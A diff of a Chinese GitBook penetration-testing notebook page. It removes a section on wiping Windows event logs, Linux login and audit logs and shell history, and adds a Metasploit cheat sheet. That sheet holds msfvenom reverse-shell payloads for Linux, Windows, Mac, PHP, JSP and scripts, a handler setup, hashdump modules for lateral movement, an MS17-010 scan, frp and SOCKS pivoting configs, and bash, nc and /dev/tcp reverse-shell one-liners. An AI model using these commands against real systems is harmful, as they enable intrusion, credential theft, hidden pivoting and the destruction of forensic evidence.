@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>痕迹清理 · GitBook</title>
+        <title>Msf · GitBook</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -57,10 +57,8 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="内网技巧.html" />
     
-    
-    <link rel="prev" href="渗透.html" />
+    <link rel="prev" href="搜索技巧.html" />
     
 
     </head>
@@ -349,7 +347,7 @@
             <ul class="articles">
                 
     
-        <li class="chapter active" data-level="1.4.1" data-path="痕迹清理.html">
+        <li class="chapter " data-level="1.4.1" data-path="痕迹清理.html">
             
                 <a href="痕迹清理.html">
             
@@ -388,7 +386,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.4.4" data-path="msf.html">
+        <li class="chapter active" data-level="1.4.4" data-path="msf.html">
             
                 <a href="msf.html">
             
@@ -436,7 +434,7 @@
     <!-- Title -->
     <h1>
         <i class="fa fa-circle-o-notch fa-spin"></i>
-        <a href=".." >痕迹清理</a>
+        <a href=".." >Msf</a>
     </h1>
 </div>
 
@@ -451,20 +449,133 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h1 id="&#x75D5;&#x8FF9;&#x6E05;&#x7406;">&#x75D5;&#x8FF9;&#x6E05;&#x7406;</h1>
-<h2 id="windows">Windows</h2>
-<pre><code class="lang-bash">wevtutil cl system      &#x6E05;&#x7406;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;
-wevtutil cl application &#x6E05;&#x7406;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x65E5;&#x5FD7;
-wevtutil cl security    &#x6E05;&#x7406;&#x5B89;&#x5168;&#x65E5;&#x5FD7;
+                                <h1 id="msf-&#x4E00;&#x6761;&#x9F99;">MSF &#x4E00;&#x6761;&#x9F99;</h1>
+<h2 id="payload&#x5236;&#x4F5C;">Payload&#x5236;&#x4F5C;</h2>
+<h3 id="linux">Linux</h3>
+<pre><code class="lang-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=12306 <span class="hljs-_">-f</span> elf &gt; shell.elf
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=12306 <span class="hljs-_">-f</span> elf &gt; shell.elf
 </code></pre>
-<h2 id="linux">Linux</h2>
-<pre><code class="lang-bash"><span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/btmp 
-<span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/wtmp
-<span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/lastlog
-<span class="hljs-built_in">echo</span> &gt; /var/<span class="hljs-built_in">log</span>/secure
-<span class="hljs-built_in">echo</span> &gt;  /var/<span class="hljs-built_in">log</span>/audit/audit.log
-<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt;  ~/.bash_<span class="hljs-built_in">history</span> 
-<span class="hljs-built_in">history</span> -c
+<h3 id="windows">Windows</h3>
+<pre><code class="lang-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=12306  <span class="hljs-_">-f</span> exe &gt; meinv.exe
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=12306  <span class="hljs-_">-f</span> exe &gt; meinv.exe
+</code></pre>
+<h3 id="mac">Mac</h3>
+<pre><code class="lang-bash">msfvenom -p osx/x64/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=12306<span class="hljs-_">-f</span> macho &gt; shell.machoWeb
+</code></pre>
+<h3 id="php">PHP</h3>
+<pre><code class="lang-bash">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=12306 <span class="hljs-_">-f</span> raw &gt; shell.php
+</code></pre>
+<h3 id="asp">ASP</h3>
+<pre><code class="lang-bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=12306 <span class="hljs-_">-f</span> asp &gt; shell.asp
+</code></pre>
+<h3 id="jsp">JSP</h3>
+<pre><code class="lang-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=12306 <span class="hljs-_">-f</span> raw &gt; shell.jsp
+</code></pre>
+<h3 id="war">WAR</h3>
+<pre><code class="lang-bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=12306 <span class="hljs-_">-f</span> war &gt; shell.war
+</code></pre>
+<h3 id="python">Python</h3>
+<pre><code class="lang-bash">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=12306 <span class="hljs-_">-f</span> raw &gt; shell.py
+</code></pre>
+<h3 id="bash">Bash</h3>
+<pre><code class="lang-bash">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=12306 <span class="hljs-_">-f</span> raw &gt; shell.sh
+</code></pre>
+<h3 id="perl">Perl</h3>
+<pre><code class="lang-bash">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=12306 <span class="hljs-_">-f</span> raw &gt; shell.pl
+</code></pre>
+<h3 id="&#x6280;&#x5DE7;">&#x6280;&#x5DE7;</h3>
+<pre><code class="lang-bash">msfvenom <span class="hljs-_">-l</span> payloads  <span class="hljs-comment">#&#x67E5;&#x770B;&#x652F;&#x6301;&#x7684;payloads </span>
+-i 10                                 <span class="hljs-comment">#&#x751F;&#x6210;payload&#x5E26;&#x4E0A;-i 10&#x8868;&#x793A;&#x5BF9;payload&#x7F16;&#x7801;10&#x6B21;</span>
+</code></pre>
+<h2 id="&#x53CD;&#x5F39;&#x8BBE;&#x7F6E;">&#x53CD;&#x5F39;&#x8BBE;&#x7F6E;</h2>
+<pre><code class="lang-bash"><span class="hljs-comment">#&#x5168;&#x5C40;&#x8BBE;&#x7F6E;&#x4EE3;&#x7406;&#xFF0C;&#x4F3C;&#x4E4E;&#x6CA1;&#x624B;&#x611F; &#x4E0D;&#x63A8;&#x8350;</span>
+<span class="hljs-comment">#set proxies socks5:127.0.0.1:8080</span>
+
+<span class="hljs-comment">#Payload&#x503C;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x4F7F;&#x7528;&#x7684;payload&#x586B;&#x5199;</span>
+<span class="hljs-built_in">set</span> exitonsession <span class="hljs-literal">false</span>
+use exploits/multi/handler
+<span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+<span class="hljs-built_in">set</span> LHOST VPSIP
+<span class="hljs-built_in">set</span> LPORT 12307
+exploit -j
+
+<span class="hljs-comment">#&#x83B7;&#x53D6;session&#x540E;&#x8BBE;&#x7F6E;&#x8DEF;&#x7531;</span>
+run post/multi/manage/autoroute
+<span class="hljs-comment">#&#x83B7;&#x53D6;&#x5404;&#x79CD;hashdump&#xFF08;search&#xFF09;&#xFF0C;&#x672A;&#x77E5;&#x5BC6;&#x7801;&#x60C5;&#x51B5;&#x4E0B;hashdump&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x6A2A;&#x5411;&#x767B;&#x5F55;&#x5176;&#x5B83;&#x4E3B;&#x673A;</span>
+
+run post/windows/gather/hashdump
+&#x6216;
+run post/windows/gather/smart_hashdump
+
+
+<span class="hljs-comment">#&#x4EE3;&#x7406;&#x8BBE;&#x7F6E; &#x611F;&#x89C9;&#x6CA1;&#x6709;frp&#x597D;&#x7528;</span>
+use auxiliary/server/socks_proxy
+<span class="hljs-comment">#&#x53EA;&#x662F;&#x4E34;&#x65F6;&#x60F3;&#x770B;&#x4E0B;&#x5185;&#x7F51;&#x670D;&#x52A1;&#x53EF;&#x4EE5;&#x505A;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#xFF0C;&#x5F88;&#x5FEB;&#x3001;&#x7A33;&#x3001;&#x4E5F;&#x65B9;&#x4FBF;&#x3002;</span>
+meterpreter &gt; portfwd add <span class="hljs-_">-l</span> 14448 -r 172.16.200.6 -p 3389
+
+<span class="hljs-comment">#&#x8BBE;&#x7F6E;&#x597D;&#x540E;&#x6839;&#x636E;&#x524D;&#x9762;&#x7684;msf&#x8DEF;&#x7531;&#x53EF;&#x4EE5;&#x6253;&#x653B;&#x51FB;&#x6D41;&#x91CF;&#xFF0C;&#x8DE8;&#x7F51;&#x6BB5;&#x7684;&#x8FD8;&#x662F;&#x7528;proxychain&#x542F;&#x52A8;msf&#x6253;&#x6BD4;&#x8F83;&#x7A33;&#x3002;</span>
+use auxiliary/scanner/smb/smb_ms17_010
+<span class="hljs-built_in">set</span> RHOSTS 10.20.100.201
+exploit
+</code></pre>
+<h2 id="&#x4EE3;&#x7406;&#x8BBE;&#x7F6E;">&#x4EE3;&#x7406;&#x8BBE;&#x7F6E;</h2>
+<h3 id="&#x4EE3;&#x7406;&#x670D;&#x52A1;frp">&#x4EE3;&#x7406;&#x670D;&#x52A1;frp</h3>
+<h4 id="frpc">frpc</h4>
+<pre><code class="lang-bash">[common]
+<span class="hljs-comment">#remote vps addr</span>
+server_addr = vpsip 
+server_port =  64447   
+tls_<span class="hljs-built_in">enable</span> = <span class="hljs-literal">true</span> 
+pool_count = 5
+
+[plugin_socks]
+<span class="hljs-built_in">type</span> = tcp 
+remote_port = 54321 
+plugin = socks5
+use_encryption = <span class="hljs-literal">true</span>
+</code></pre>
+<h4 id="frps">frps</h4>
+<pre><code class="lang-bash">[common]
+<span class="hljs-built_in">bind</span>_addr = 0.0.0.0
+<span class="hljs-built_in">bind</span>_port = 64447 
+
+dashboard_port = 7500
+dashboard_user = admin1
+</code></pre>
+<h3 id="&#x4EE3;&#x7406;&#x670D;&#x52A1;regeorg">&#x4EE3;&#x7406;&#x670D;&#x52A1;<strong>reGeorg</strong></h3>
+<pre><code class="lang-bash">&#x53C2;&#x89C1;Readme
+</code></pre>
+<h3 id="ssh&#x4EE3;&#x7406;&#x8BBF;&#x95EE;">ssh&#x4EE3;&#x7406;&#x8BBF;&#x95EE;</h3>
+<pre><code>ssh -o &quot;ProxyCommand nc -X 5 -x x.x.x.x:8888 %h %p&quot; root@192.168.80.8
+
+5 - socks5
+</code></pre><h3 id="&#x4EE3;&#x7406;&#x5BA2;&#x6237;&#x7AEF;">&#x4EE3;&#x7406;&#x5BA2;&#x6237;&#x7AEF;</h3>
+<h4 id="proxychain4">proxychain4</h4>
+<pre><code class="lang-bash"><span class="hljs-comment">#&#x914D;&#x7F6E;proxychain&#x7684;&#x4EE3;&#x7406;&#x8FDE;&#x4E0A;frp&#xFF0C;&#x7AEF;&#x53E3;&#x4E3A;54321</span>
+proxychain4 msfconsole
+</code></pre>
+<h4 id="&#x6D4F;&#x89C8;&#x5668;">&#x6D4F;&#x89C8;&#x5668;</h4>
+<pre><code class="lang-bash"><span class="hljs-comment"># &#x914D;&#x7F6E;&#x53C2;&#x6570;&#x53C2;&#x8003;</span>
+sock5
+ip vps
+port 54321
+<span class="hljs-comment"># &#x6CE8;&#x610F; &#x8C37;&#x6B4C;&#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x652F;&#x6301;&#x5E26;&#x5BC6;&#x7801;&#x7684;sock5</span>
+</code></pre>
+<h2 id="&#x5176;&#x5B83;">&#x5176;&#x5B83;</h2>
+<pre><code class="lang-bash"><span class="hljs-comment">#&#x7B80;&#x6613;&#x7248;&#x53CD;&#x8FDE;</span>
+
+<span class="hljs-comment"># Linux vul&#x673A;&#x5668;</span>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 |nc IP 4444 &gt;/tmp/f 
+&#x6216;
+bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1
+
+<span class="hljs-comment"># Window vul&#x673A;&#x5668;</span>
+nc ip 4444 <span class="hljs-_">-e</span> c:\windows\system32\cmd.exe
+
+<span class="hljs-comment">#&#x53CD;&#x5F39;&#x673A;&#x5668;</span>
+nc -lvp 4444
 </code></pre>
 
                                 
@@ -493,14 +604,10 @@ wevtutil cl security    &#x6E05;&#x7406;&#x5B89;&#x5168;&#x65E5;&#x5FD7;
 
             
                 
-                <a href="渗透.html" class="navigation navigation-prev " aria-label="Previous page: 渗透">
+                <a href="搜索技巧.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: 搜索技巧">
                     <i class="fa fa-angle-left"></i>
                 </a>
                 
-                
-                <a href="内网技巧.html" class="navigation navigation-next " aria-label="Next page: 内网技巧">
-                    <i class="fa fa-angle-right"></i>
-                </a>
                 
             
         
@@ -509,7 +616,7 @@ wevtutil cl security    &#x6E05;&#x7406;&#x5B89;&#x5168;&#x65E5;&#x5FD7;
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"痕迹清理","level":"1.4.1","depth":2,"next":{"title":"内网技巧","level":"1.4.2","depth":2,"path":"渗透/内网技巧.md","ref":"渗透/内网技巧.md","articles":[]},"previous":{"title":"渗透","level":"1.4","depth":1,"path":"渗透/渗透.md","ref":"渗透/渗透.md","articles":[{"title":"痕迹清理","level":"1.4.1","depth":2,"path":"渗透/痕迹清理.md","ref":"渗透/痕迹清理.md","articles":[]},{"title":"内网技巧","level":"1.4.2","depth":2,"path":"渗透/内网技巧.md","ref":"渗透/内网技巧.md","articles":[]},{"title":"搜索技巧","level":"1.4.3","depth":2,"path":"渗透/搜索技巧.md","ref":"渗透/搜索技巧.md","articles":[]},{"title":"Msf","level":"1.4.4","depth":2,"path":"渗透/msf.md","ref":"渗透/msf.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr","-search","search-pro","copy-code-button","simple-mind-map"],"pluginsConfig":{"simple-mind-map":{"autoFit":true,"linkShape":"diagonal","preset":"colorful","style":{"height":"750px"},"type":"markdown"},"search-pro":{},"copy-code-button":{},"highlight":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"渗透/痕迹清理.md","mtime":"2021-07-09T02:17:35.796Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-04-20T00:41:57.244Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Msf","level":"1.4.4","depth":2,"previous":{"title":"搜索技巧","level":"1.4.3","depth":2,"path":"渗透/搜索技巧.md","ref":"渗透/搜索技巧.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr","-search","search-pro","copy-code-button","simple-mind-map","livereload"],"pluginsConfig":{"simple-mind-map":{"autoFit":true,"linkShape":"diagonal","preset":"colorful","style":{"height":"750px"},"type":"markdown"},"search-pro":{},"copy-code-button":{},"livereload":{},"highlight":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"渗透/msf.md","mtime":"2021-11-05T09:09:11.829Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-04-20T00:46:33.558Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -532,6 +639,10 @@ wevtutil cl security    &#x6E05;&#x7406;&#x5B89;&#x5168;&#x65E5;&#x5FD7;
     
         
         <script src="../gitbook/gitbook-plugin-simple-mind-map/bundle.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
         
     
         
